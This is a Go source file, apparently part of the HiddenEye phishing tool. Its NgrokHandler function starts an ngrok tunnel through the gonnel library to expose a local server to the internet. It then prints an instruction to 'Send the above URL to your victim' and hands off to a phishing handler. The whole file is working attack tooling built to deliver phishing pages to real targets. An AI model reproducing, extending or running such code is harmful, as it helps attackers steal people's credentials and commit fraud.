package services

import (
	"bufio"
	"fmt"
	"os"
	"strconv"

	Colors "HiddenEye/utils"

	"github.com/afdalwahyu/gonnel"
)

func NgrokHandler(port int, url string) {
	p := strconv.Itoa(port)
	client, err := gonnel.NewClient(gonnel.Options{
		BinaryPath: "./ngrok_bin/ngrok",
	})
	if err != nil {
		fmt.Println(err)
	}
	defer client.Close()

	done := make(chan bool)
	go client.StartServer(done)
	<-done

	client.AddTunnel(&gonnel.Tunnel{
		Proto:        gonnel.HTTP,
		Name:         "HiddenEye",
		LocalAddress: "127.0.0.1:" + p,
	})

	client.ConnectAll()

	fmt.Print(Colors.Red(), "\n\n\t["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Send the above URL to your victim\n\n")

	PhisingHandler(port, url)

	fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.Red(), "Press Enter to EXIT...", Colors.White())

	reader := bufio.NewReader(os.Stdin)
	reader.ReadRune()

	client.DisconnectAll()
}
